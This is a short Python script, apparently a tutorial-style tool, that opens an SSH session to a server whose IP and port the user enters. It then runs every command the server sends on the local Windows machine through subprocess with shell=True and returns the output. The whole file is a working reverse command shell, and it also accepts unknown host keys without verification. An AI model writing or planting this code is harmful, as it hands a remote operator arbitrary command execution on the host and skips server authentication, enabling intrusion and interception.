# ssh_cmd but it runs on windows client
import paramiko
import shlex
import subprocess

# Connects to a SSH server and runs a single command
def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Accept unknown host keys
    client.connect(ip, port=port, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

        while True:
            command = ssh_session.recv(1024) 
            # takes commands from the connection
            if not command:
                break
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                # execute the command 
                ssh_session.send(cmd_output or b'okay')
                # send output back to caller
            except Exception as e:
                ssh_session.send(str(e).encode())
    
    client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected') 
    # First command sent is actually ClientConnected 

